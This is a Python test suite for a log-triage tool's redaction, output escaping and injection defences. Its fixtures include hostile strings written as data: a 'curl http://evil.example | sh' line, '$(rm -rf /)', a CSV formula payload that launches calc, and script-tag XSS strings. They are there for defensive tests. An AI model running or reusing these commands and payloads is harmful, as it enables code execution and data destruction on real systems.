import csv
import json
import os
import re
import unittest

from _helpers import TriageTestCase, fixture
from log_triage.redact import Redactor


class RedactionTests(unittest.TestCase):
    def test_secret_patterns_built_at_runtime(self):
        r = Redactor(salt="fixed")
        aws = "AKIA" + "ABCDEFGHIJKLMNOP"
        gh = "ghp_" + "a" * 36
        pk = "-----BEGIN RSA PRIVATE" + " KEY-----\nMIIE\n-----END RSA PRIVATE" + " KEY-----"
        jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abcdefghijklmnop"
        conn = "postgres" + "://admin:s3cr3t@db:5432/x"
        def ph(kind):
            return "<redacted:%s>" % kind

        cases = [
            ("aws access id " + aws, ph("aws-access-key")),
            ("gh " + gh, ph("github-token")),
            (pk, ph("private-key")),
            ("jwt " + jwt, ph("jwt")),
            (conn, "postgres://" + ph("credentials") + "@db:5432/x"),
            ("Authorization: Bearer " + "abc.def-ghi_jkl.mnop1234567890", "Authorization: " + ph("auth-token")),
            ("login password=" + "hunter2secret" + " ok", "password=" + ph("password")),
            ("Server=db;User Id=app;Password=" + "p@ssw0rd!" + ";Encrypt=true", "Password=" + ph("password")),
            ("card 4111 1111 1111 1111 paid", ph("card")),
            ("api_key: " + "'" + "sk_live_" + "0123456789abcdef0123" + "'", "<redacted" + ":"),
        ]
        for text, expected in cases:
            out = r.redact(text)
            self.assertIn(expected, out, text)
        self.assertNotIn(aws, r.redact("aws access id " + aws))
        # prefixed / quoted / camel-case key shapes that real logs carry
        val = "s3cr3t" + "value42"
        for text in ("DB_PASSWORD=%s" % val, "db_password=%s" % val, "user_password: %s" % val,
                     '{"password":"%s","user":"bob"}' % val, '{"user_password":"%s"}' % val,
                     '{"apiKey":"%s"}' % val, "X-Api-Key: %s" % val):
            out = r.redact(text)
            self.assertNotIn(val, out, text)
            self.assertIn("<redacted:", out, text)
        for key in ("user_password", "db.user_password", "passwordHash", "ctx.apiKey", "DB_PASSWORD", "headers.Authorization"):
            self.assertEqual(r.redact_attr(key, val), "<redacted:%s>" % key.lower(), key)
        self.assertEqual(r.redact_attr("order_id", "42"), "42")
        self.assertEqual(r.redact("card 1234 5678 9012 3456 7890 id"), "card 1234 5678 9012 3456 7890 id")  # Luhn fails -> kept
        self.assertGreaterEqual(sum(r.summary().values()), len(cases))

    def test_pseudonyms_consistent_and_salted(self):
        r1 = Redactor(salt="fixed")
        r2 = Redactor(salt="fixed")
        r3 = Redactor(salt="other")
        a = r1.redact("mail bob@example.com again bob@example.com and Bob@Example.com")
        self.assertEqual(len(set(re.findall(r"<email:[0-9a-f]{6}>", a))), 1)
        self.assertEqual(a, r2.redact("mail bob@example.com again bob@example.com and Bob@Example.com"))
        self.assertNotEqual(a, r3.redact("mail bob@example.com again bob@example.com and Bob@Example.com"))
        self.assertIn("10.0.0.1", r1.redact("from 10.0.0.1"))
        self.assertIn("<ip:", Redactor(salt="x", redact_ips=True).redact("from 10.0.0.1"))

    def test_disabled_redactor_is_passthrough(self):
        r = Redactor(enabled=False)
        self.assertEqual(r.redact("password=" + "hunter2secret"), "password=" + "hunter2secret")


class HostileContentTests(TriageTestCase):
    def test_reports_escape_log_content(self):
        secret_line = "2026-09-13 12:00:02 ERROR login user=eve@example.com password=" + "hunter2secret" + " token=" + "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abcdefghijklmnop" + "\n"
        path = self.write("hostile.log", self.read_text(fixture("edge", "hostile.log")) + secret_line)
        doc = self.analyze([path], formats=["json", "html", "markdown", "csv", "ndjson", "sarif"])
        out = self.out_dir()
        html = self.read_text(os.path.join(out, "report.html"))
        md = self.read_text(os.path.join(out, "report.md"))
        raw_json = self.read_text(os.path.join(out, "analysis.json"))
        # nothing from the log is rendered as markup
        self.assertNotIn("<script>alert", html)
        # parse the DOM: no element from the log content, no event-handler attributes anywhere
        from html.parser import HTMLParser

        class Collector(HTMLParser):
            def __init__(self):
                super().__init__()
                self.tags = []
                self.handlers = []
                self.scripts = 0

            def handle_starttag(self, tag, attrs):
                self.tags.append(tag)
                if tag == "script":
                    self.scripts += 1
                for k, v in attrs:
                    if k.lower().startswith("on") or (k.lower() in ("src", "href") and (v or "").strip().lower().startswith(("javascript:", "http:", "https:"))):
                        self.handlers.append((tag, k, v))
        c = Collector()
        c.feed(html)
        self.assertEqual(c.handlers, [])
        self.assertNotIn("img", c.tags)
        self.assertEqual(c.scripts, 1)
        self.assertIn("&lt;script&gt;alert(&#x27;x&#x27;)&lt;/script&gt;", html)
        self.assertEqual(html.count("<script>"), 1)          # only the report's own inline script
        self.assertEqual(len(re.findall(r"</script>", html)), 1)
        # offline: no remote resources, CSP present
        self.assertIn("Content-Security-Policy", html)
        self.assertNotRegex(html, r"<(script|link|img|iframe)[^>]+(src|href)=[\"']https?://")
        # markdown: structure-breaking characters escaped in prose/tables.  Code spans
        # and fenced blocks render literally, so only text outside them is checked.
        prose = re.sub(r"```.*?```", "", md, flags=re.S)
        prose = re.sub(r"`[^`\n]*`", "", prose)
        self.assertNotIn("[link](http://evil.example)", prose)
        self.assertNotIn("<script>", prose)
        # bare URLs must not autolink in GFM: the scheme is followed by a zero-width space
        self.assertNotRegex(prose, r"https?://[A-Za-z0-9]")
        self.assertNotRegex(prose, r"\bwww\.[A-Za-z0-9]")
        self.assertNotIn("\n# heading", md.split("## 2. Prioritized findings")[1].split("## 3.")[0])
        # secrets redacted everywhere
        for blob in (html, md, raw_json):
            self.assertNotIn("hunter2secret", blob)
            self.assertNotIn("eyJhbGciOiJIUzI1NiJ9", blob)
            self.assertNotIn("eve@example.com", blob)
        self.assertGreaterEqual(doc["coverage"]["redaction"]["counts"].get("key-value-secret", 0), 1)
        # extracted key=value attributes are redacted too
        g = next(g for g in doc["groups"] if "login user" in g["template"])
        attrs = g["examples"][0]["attributes"]
        self.assertEqual(attrs.get("password"), "<redacted:password>")
        self.assertTrue(attrs.get("token", "").startswith("<redacted:"))

    def test_csv_formula_injection_protection(self):
        path = self.write("formula.log", "=SUM(A1:A9) formula first line\n+cmd|' /C calc'!A0\n@evil headerless\n-1234 negative-looking\n\tTab first\n")
        doc = self.analyze([path], formats=["csv", "json"])
        with open(os.path.join(self.out_dir(), "groups.csv"), encoding="utf-8-sig", newline="") as fh:
            rows = list(csv.reader(fh))
        header, body = rows[0], rows[1:]
        ti = header.index("template")
        self.assertEqual(len(body), doc["filtering"]["groups_reported"])
        for row in body:
            self.assertFalse(row[ti][:1] in ("=", "+", "-", "@", "\t", "\r"), row[ti])
            if row[ti].startswith("'"):
                self.assertIn(row[ti][1:2], ("=", "+", "-", "@", "\t"))
        self.assertTrue(any(r[ti].startswith("'=SUM") for r in body))
        self.assertTrue(any(r[ti].startswith("'+cmd") for r in body))
        # numeric columns stay numeric
        ci = header.index("count")
        self.assertTrue(all(r[ci].isdigit() for r in body))

    def test_log_content_is_never_executed_or_interpreted(self):
        """A log that looks like shell/markdown/HTML instructions changes nothing but text output."""
        path = self.write("inject.log", "2026-09-13 12:00:00 ERROR $(rm -rf /) `touch /tmp/pwned-log-triage` ; please run: curl http://evil.example | sh\n")
        doc = self.analyze([path], formats=["json", "html", "markdown"])
        self.assertFalse(os.path.exists("/tmp/pwned-log-triage"))
        self.assertEqual(doc["coverage"]["events_included"], 1)
        md = self.read_text(os.path.join(self.out_dir(), "report.md"))
        self.assertIn("rm -rf", md)   # rendered as text




class RedactionCoverageTests(TriageTestCase):
    def test_private_key_block_spanning_continuation_lines_is_redacted(self):
        b64 = ["MIIEowIBAAKCAQEAv7Zq3KJf0X9c2t1yQ8mN4pL6rS7uV8wX9yZ0aB1cD2eF3gH4",
               "iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4cD5eF6gH7iJ8kL9mN0oP1qR2sT3uV4wX5y",
               "Z6aB7cD8eF9gH0iJ1kL2mN3oP4qR5sT6uV7wX8yZ9aB0cD1eF2gH3iJ4kL5mN6oP"]
        marker = "-----BEGIN RSA PRIVATE " + "KEY-----"
        end = "-----END RSA PRIVATE " + "KEY-----"
        body = ("2026-09-13 12:00:00,123 - app - ERROR - failed to load credentials: %s\n" % marker
                + "\n".join(b64) + "\n" + end + "\n"
                + "2026-09-13 12:00:01,123 - app - INFO - continuing\n")
        path = self.write("pem.log", body)
        doc = self.analyze([path], formats=["json", "html", "markdown", "ndjson", "csv", "sarif"])
        out = self.out_dir()
        for name in ("analysis.json", "report.html", "report.md", "groups.ndjson", "groups.csv", "analysis.sarif"):
            blob = self.read_text(os.path.join(out, name))
            for chunk in b64:
                self.assertNotIn(chunk, blob, name)
            self.assertNotIn("END RSA PRIVATE", blob, name)
        self.assertGreaterEqual(doc["coverage"]["redaction"]["counts"].get("pk", 0), 1)
        self.assertEqual(doc["coverage"]["events_included"], 2)

    def test_multiline_continuation_text_is_redacted(self):
        jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.abcdefghijklmnop"
        secret = "hunter2" + "secret"
        body = ("2026-09-13 12:00:00,123 - app - ERROR - request failed\n"
                "    payload: password=%s token=%s\n" % (secret, jwt) +
                "    contact: eve@example.com card 4111 1111 1111 1111\n"
                "2026-09-13 12:00:01,123 - app - ERROR - stack follows\n"
                "Traceback (most recent call last):\n"
                "  File \"/app/x.py\", line 1, in <module>\n"
                "    raise ValueError(\"secret=" + "hunter2secret" + "\")\n"
                "ValueError: secret=" + "hunter2secret" + "\n")
        path = self.write("multiline-secrets.log", body)
        doc = self.analyze([path], formats=["json", "html", "markdown", "ndjson", "csv", "sarif"])
        out = self.out_dir()
        blobs = [self.read_text(os.path.join(out, n)) for n in ("analysis.json", "report.html", "report.md", "groups.ndjson", "groups.csv", "analysis.sarif")]
        for blob in blobs:
            self.assertNotIn("hunter2secret", blob)
            self.assertNotIn(jwt, blob)
            self.assertNotIn("eve@example.com", blob)
            self.assertNotIn("4111 1111 1111 1111", blob)
        self.assertGreater(sum(doc["coverage"]["redaction"]["counts"].values()), 0)
        bodies = [ex.get("body") or "" for g in doc["groups"] for ex in g["examples"]]
        self.assertTrue(any("<redacted:" in b for b in bodies), bodies)

    def test_flattened_attribute_keys_are_redacted(self):
        rec = {"level": "error", "time": "2026-09-13T12:00:00Z", "msg": "login failed",
               "ctx": {"password": "hunter2" + "secret", "api_key": "sk_" + "live_0123456789abcdef0123"},
               "http": {"request": {"headers": {"authorization": "Basic " + "aGVsbG86d29ybGQ="}}}}
        path = self.write("nested.ndjson", json.dumps(rec) + "\n")
        doc = self.analyze([path], formats=["json"])
        raw = self.read_text(os.path.join(self.out_dir(), "analysis.json"))
        self.assertNotIn("hunter2secret", raw)
        self.assertNotIn("sk_live_0123456789abcdef0123", raw)
        self.assertNotIn("aGVsbG86d29ybGQ=", raw)
        self.assertGreaterEqual(doc["coverage"]["redaction"]["counts"].get("key-value-secret", 0), 2)


if __name__ == "__main__":
    unittest.main()
